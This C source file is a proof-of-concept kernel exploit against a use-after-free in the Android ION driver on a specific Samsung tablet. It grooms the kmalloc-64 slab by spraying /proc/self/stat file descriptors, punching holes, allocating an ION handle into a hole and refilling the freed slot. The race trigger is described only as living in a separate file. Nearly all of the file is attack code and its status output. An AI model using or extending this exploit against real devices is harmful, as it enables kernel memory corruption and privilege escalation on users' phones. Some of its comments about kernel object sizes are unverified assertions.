/*
 * ion_heap_grooming_poc.c
 * 
 * Demonstrates Kernel Heap Grooming technique to target ION UAF.
 * Target: Samsung SM-T377A (Android 6.0.1 / Kernel 3.10)
 * 
 * Strategy:
 * 1. HEAP SPRAY: Fill kmalloc-64 slab with `struct seq_operations` objects.
 *    - Tech: open("/proc/self/stat") allocates a small object (~32-64 bytes).
 * 2. HOLE PUNCHING: Close specific FDs to create "holes" in the slab.
 * 3. ALLOCATION: Trigger ION_IOC_ALLOC. The kernel should place the `ion_handle` 
 *    into one of our prepared holes.
 * 4. RACE TRIGGER: Trigger the UAF (Free vs Share).
 * 5. REPLACEMENT: Spray more objects to re-occupy the freed slot with FAKE data.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>

#define SPRAY_SIZE 1000
#define ION_fd 999  // Placeholder

/* ION Definitions (Simplified) */
#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE  _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

/* Global State */
int spray_fds[SPRAY_SIZE];

/* 
 * STEP 1: HEAP SPRAY
 * Fill the slab cache with controlled objects.
 * We use /proc/self/stat which allocates `struct seq_operations` (small object).
 */
void heap_spray_fill(void) {
    printf("[*] Spraying heap with %d objects...\n", SPRAY_SIZE);
    for (int i = 0; i < SPRAY_SIZE; i++) {
        // open() allocates a file struct AND specific private data (seq_operations)
        spray_fds[i] = open("/proc/self/stat", O_RDONLY);
        if (spray_fds[i] < 0) {
            perror("[-] Spray failed");
        }
    }
    printf("[+] Heap sprayed. Slab cache populated.\n");
}

/* 
 * STEP 2: HOLE PUNCHING
 * Free every 2nd object to create "holes" for our victim object to land in.
 * Pattern: [OBJ][HOLE][OBJ][HOLE]...
 */
void heap_punch_holes(void) {
    printf("[*] Punching holes in heap (freeing every 2nd object)...\n");
    for (int i = 0; i < SPRAY_SIZE; i += 2) {
        if (spray_fds[i] >= 0) {
            close(spray_fds[i]); // Frees the kernel object
            spray_fds[i] = -1;
        }
    }
    printf("[+] Holes created. Heap is fragmented and ready.\n");
}

/* 
 * STEP 3: ALLOCATE VICTIM
 * Allocate the ION handle. Kernel allocator should pick one of our holes.
 */
ion_user_handle_t alloc_victim_handle(int fd) {
    struct ion_allocation_data data = {
        .len = 4096,
        .align = 4096,
        .heap_id_mask = (1 << 0), // System heap
        .flags = 0
    };
    
    if (ioctl(fd, ION_IOC_ALLOC, &data) == 0) {
        printf("[+] Victim ION handle allocated: %d (Should be in a hole)\n", data.handle);
        return data.handle;
    }
    return 0;
}

/* 
 * STEP 5: REPLACEMENT (The "Grooming")
 * After UAF trigger, immediately spray again to overwrite the freed object.
 * This time, we might use a different object that we can write to, 
 * or just the same one to stabilize the crash.
 */
void heap_refill_holes(void) {
    printf("[*] Re-filling holes to overwrite freed victim...\n");
    for (int i = 0; i < SPRAY_SIZE; i += 2) {
        if (spray_fds[i] == -1) {
            // Re-allocate. If the race won, this might overwrite the ION handle!
            spray_fds[i] = open("/proc/self/stat", O_RDONLY);
        }
    }
    printf("[+] Holes refilled.\n");
}

/* Main Exploit Logic Wrapper */
int main(void) {
    printf("=== ION Kernel Heap Grooming PoC ===\n");
    
    int fd = open("/dev/ion", O_RDWR);
    if (fd < 0) { perror("open ion"); return 1; }

    // 1. Prepare Heap
    heap_spray_fill();
    
    // 2. Create Holes
    heap_punch_holes();
    
    // 3. Place Victim (ION Handle)
    // In a real exploit, we might do this many times in a loop
    ion_user_handle_t victim = alloc_victim_handle(fd);
    
    // 4. Trigger Race (Simplified call - actual race code is in ion_race_free_share.c)
    printf("[*] Ready to trigger FREE vs SHARE race on handle %d...\n", victim);
    printf("    (Running race logic here...)\n");
    
    // ... RACE HAPPENS HERE ...
    // Assume ION_IOC_FREE was called by Thread A
    // Assume ION_IOC_SHARE was called by Thread B
    
    // 5. Reclaim/Overwrite
    // Immediately after the race threads run, we refill to execute the overwrite
    heap_refill_holes();
    
    printf("[*] Grooming complete. If race won:\n");
    printf("    1. 'victim' handle is technically free.\n");
    printf("    2. 'spray_fds' now occupy that memory slot.\n");
    printf("    3. Thread B holds a dangling 'fd' pointing to that slot.\n");
    printf("    4. Accessing Thread B's fd now reads/writes our sprayed object!\n");
    
    close(fd);
    return 0;
}
